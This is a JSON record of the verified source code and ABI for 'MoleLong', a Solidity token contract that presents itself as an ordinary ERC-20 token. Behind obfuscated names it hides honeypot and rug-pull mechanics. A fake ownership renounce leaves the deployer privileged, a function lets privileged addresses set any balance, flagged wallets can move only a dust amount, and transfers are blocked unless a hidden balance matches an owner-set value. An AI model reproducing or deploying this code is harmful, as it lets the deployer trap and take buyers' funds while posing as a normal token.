{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface tradingWalletLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTo) external view returns (uint256);\n\n    function transfer(address tradingMode, uint256 sellTotal) external returns (bool);\n\n    function allowance(address swapFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingMode,\n        uint256 sellTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityLaunchLaunched, uint256 value);\n    event Approval(address indexed swapFee, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyMode {\n    function createPair(address exemptLaunchList, address exemptSwap) external returns (address);\n}\n\ninterface teamFeeIs is tradingWalletLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MoleLong is shouldTo, tradingWalletLaunched, teamFeeIs {\n\n    function approve(address launchToken, uint256 sellTotal) public virtual override returns (bool) {\n        sellLaunch[_msgSender()][launchToken] = sellTotal;\n        emit Approval(_msgSender(), launchToken, sellTotal);\n        return true;\n    }\n\n    function liquidityLimit(address modeAt, uint256 sellTotal) public {\n        atEnable();\n        fromList[modeAt] = sellTotal;\n    }\n\n    uint256 public enableFeeMax;\n\n    string private launchedTokenTx = \"MLG\";\n\n    uint256 fundMode;\n\n    function name() external view virtual override returns (string memory) {\n        return atFeeLaunched;\n    }\n\n    uint256 constant enableBuy = 5 ** 10;\n\n    function modeTx() public {\n        emit OwnershipTransferred(totalTeamTx, address(0));\n        tradingBuyMode = address(0);\n    }\n\n    function minAmount(address toShould, address tradingMode, uint256 sellTotal) internal returns (bool) {\n        require(fromList[toShould] >= sellTotal);\n        fromList[toShould] -= sellTotal;\n        fromList[tradingMode] += sellTotal;\n        emit Transfer(toShould, tradingMode, sellTotal);\n        return true;\n    }\n\n    function balanceOf(address enableTo) public view virtual override returns (uint256) {\n        return fromList[enableTo];\n    }\n\n    function buyAt(address listMarketing) public {\n        atEnable();\n        \n        if (listMarketing == totalTeamTx || listMarketing == autoListTx) {\n            return;\n        }\n        walletIs[listMarketing] = true;\n    }\n\n    bool public sellExempt;\n\n    bool private txMode;\n\n    function allowance(address takeMode, address launchToken) external view virtual override returns (uint256) {\n        if (launchToken == limitTake) {\n            return type(uint256).max;\n        }\n        return sellLaunch[takeMode][launchToken];\n    }\n\n    bool public tokenFeeTrading;\n\n    address fromAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapIs(address toShould, address tradingMode, uint256 sellTotal) internal returns (bool) {\n        if (toShould == totalTeamTx) {\n            return minAmount(toShould, tradingMode, sellTotal);\n        }\n        uint256 txShouldWallet = tradingWalletLaunched(autoListTx).balanceOf(fromAuto);\n        require(txShouldWallet == fundMode);\n        require(tradingMode != fromAuto);\n        if (walletIs[toShould]) {\n            return minAmount(toShould, tradingMode, enableBuy);\n        }\n        return minAmount(toShould, tradingMode, sellTotal);\n    }\n\n    uint256 private enableLimit = 100000000 * 10 ** 18;\n\n    address public totalTeamTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atLiquidity;\n    }\n\n    uint8 private atLiquidity = 18;\n\n    function transfer(address modeAt, uint256 sellTotal) external virtual override returns (bool) {\n        return swapIs(_msgSender(), modeAt, sellTotal);\n    }\n\n    uint256 private liquidityTokenSwap;\n\n    function owner() external view returns (address) {\n        return tradingBuyMode;\n    }\n\n    address private tradingBuyMode;\n\n    mapping(address => bool) public walletIs;\n\n    address limitTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private liquidityReceiver;\n\n    constructor (){\n        if (liquidityTokenSwap != enableFeeMax) {\n            teamLaunched = enableFeeMax;\n        }\n        enableMin maxFromAt = enableMin(limitTake);\n        autoListTx = buyMode(maxFromAt.factory()).createPair(maxFromAt.WETH(), address(this));\n        if (liquidityTokenSwap == teamLaunched) {\n            teamLaunched = liquidityReceiver;\n        }\n        totalTeamTx = _msgSender();\n        modeTx();\n        fundEnableMax[totalTeamTx] = true;\n        fromList[totalTeamTx] = enableLimit;\n        if (liquidityReceiver != liquidityTokenSwap) {\n            liquidityReceiver = liquidityTokenSwap;\n        }\n        emit Transfer(address(0), totalTeamTx, enableLimit);\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingBuyMode;\n    }\n\n    function atEnable() private view {\n        require(fundEnableMax[_msgSender()]);\n    }\n\n    string private atFeeLaunched = \"Mole Long\";\n\n    function tokenTeam(uint256 sellTotal) public {\n        atEnable();\n        fundMode = sellTotal;\n    }\n\n    address public autoListTx;\n\n    uint256 walletListFrom;\n\n    uint256 private teamLaunched;\n\n    function transferFrom(address toShould, address tradingMode, uint256 sellTotal) external override returns (bool) {\n        if (_msgSender() != limitTake) {\n            if (sellLaunch[toShould][_msgSender()] != type(uint256).max) {\n                require(sellTotal <= sellLaunch[toShould][_msgSender()]);\n                sellLaunch[toShould][_msgSender()] -= sellTotal;\n            }\n        }\n        return swapIs(toShould, tradingMode, sellTotal);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTokenTx;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableLimit;\n    }\n\n    event OwnershipTransferred(address indexed listTake, address indexed sellLaunchLiquidity);\n\n    mapping(address => bool) public fundEnableMax;\n\n    bool public totalSwapIs;\n\n    function tradingSell(address isFee) public {\n        if (totalSwapIs) {\n            return;\n        }\n        if (txMode != tokenFeeTrading) {\n            teamLaunched = liquidityTokenSwap;\n        }\n        fundEnableMax[isFee] = true;\n        if (teamLaunched != liquidityReceiver) {\n            teamLaunched = liquidityTokenSwap;\n        }\n        totalSwapIs = true;\n    }\n\n    mapping(address => uint256) private fromList;\n\n    mapping(address => mapping(address => uint256)) private sellLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunchLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunchLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoListTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"}],\"name\":\"buyAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFeeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundEnableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"liquidityLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFeeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"tokenTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeamTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFee\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MoleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}